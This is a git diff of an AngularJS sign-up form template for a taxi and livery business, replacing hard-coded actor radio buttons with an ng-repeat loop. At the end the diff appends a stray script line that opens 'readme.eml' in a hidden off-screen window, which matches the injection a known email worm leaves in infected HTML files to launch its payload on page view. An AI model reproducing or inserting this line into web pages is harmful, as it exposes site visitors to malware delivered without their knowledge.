@@ -26,84 +26,13 @@
 												 		<h2>Category A : You are one of the actors to the Taxi and livery business</h2>
 											 	 </div>
 												 <div class="row">
-													 <div class="col-md-6 col-sm-12 col-xs-12">
+													 <div class="col-md-6 col-sm-12 col-xs-12" ng-repeat="catA in categoriesA">
 														 <div class="form-group">
-																<input type="radio" style="width:2em;"  ng-model="user.actor" name="actor">Garage Dispatcher<br/>
+																<input type="radio" style="width:2em;"  ng-model="user.actor" value="{{catA}}" name="actor">{{catA}}<br/>
 														 </div>
 													 </div>
-													 <span class="col-md-6 col-sm-12 col-xs-12">
-														 <span class="form-group">
-															 <input type="radio" style="width:2em;"  ng-model="user.actor" name="actor"/>Medallion Owner<br/>
-														 </span>
-													 </span>
 												 </div>
-
-												 <div class="row">
-													<div class="col-md-6 col-sm-12 col-xs-12">
-														<div class="form-group">
-															 <input type="radio" style="width:2em;" ng-model="user.actor" name="actor"/>Hotel Doorman <br/>
-														</div>
-													</div>
-													<div class="col-md-6 col-sm-12 col-xs-12">
-														<div class="form-group">
-															<input type="radio" style="width:2em;" ng-model="user.actor" name="actor"/>Garage Owner <br/>
-														</div>
-													</div>
-												</div>
-
-												<div class="row">
-												 <div class="col-md-6 col-sm-12 col-xs-12">
-													 <div class="form-group">
-															<input type="radio" style="width:2em;" ng-model="user.actor" name="actor"/>Building Doorman <br/>
-													 </div>
-												 </div>
-												 <div class="col-md-6 col-sm-12 col-xs-12">
-													 <div class="form-group">
-														 <input type="radio" style="width:2em;" ng-model="user.actor" name="actor"/>TLC Commisioner<br/>
-													 </div>
-												 </div>
-											 </div>
-
-											 <div class="row">
-												<div class="col-md-6 col-sm-12 col-xs-12">
-													<div class="form-group">
-														 <input type="radio" style="width:2em;" ng-model="user.actor" name="actor"/>Medallion Brookers or Corp. <br/>
-													</div>
-												</div>
-												<div class="col-md-6 col-sm-12 col-xs-12">
-													<div class="form-group">
-														<input type="radio" style="width:2em;" ng-model="user.actor" name="actor"/>DMV & TLC Lawyer<br/>
-													</div>
-												</div>
-											</div>
-
-											<div class="row">
-											 <div class="col-md-6 col-sm-12 col-xs-12">
-												 <div class="form-group">
-														<input type="radio" style="width:2em;" ng-model="user.actor" name="actor"/>Radio Dispatcher. <br/>
-												 </div>
-											 </div>
-											 <div class="col-md-6 col-sm-12 col-xs-12">
-												 <div class="form-group">
-													 <input type="radio" style="width:2em;" ng-model="user.actor" name="actor"/>DMV Lawyer<br/>
-												 </div>
-											 </div>
-										 </div>
-
-										 <div class="row">
-											<div class="col-md-6 col-sm-12 col-xs-12">
-												<div class="form-group">
-													 <input type="radio" style="width:2em;" ng-model="user.actor" name="actor"/>City Dispatcher. <br/>
-												</div>
-											</div>
-											<div class="col-md-6 col-sm-12 col-xs-12">
-												<div class="form-group">
-													<input type="radio" style="width:2em;" ng-model="user.actor" name="actor"/>TLC Lawyer<br/>
-												</div>
-											</div>
-										</div>
-
-								 </div>
+								 		  </div>
 
 								 <div class="step2b">
 									 <div class="row">
@@ -302,3 +231,5 @@
 				</div>
 			</div>
 </div>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
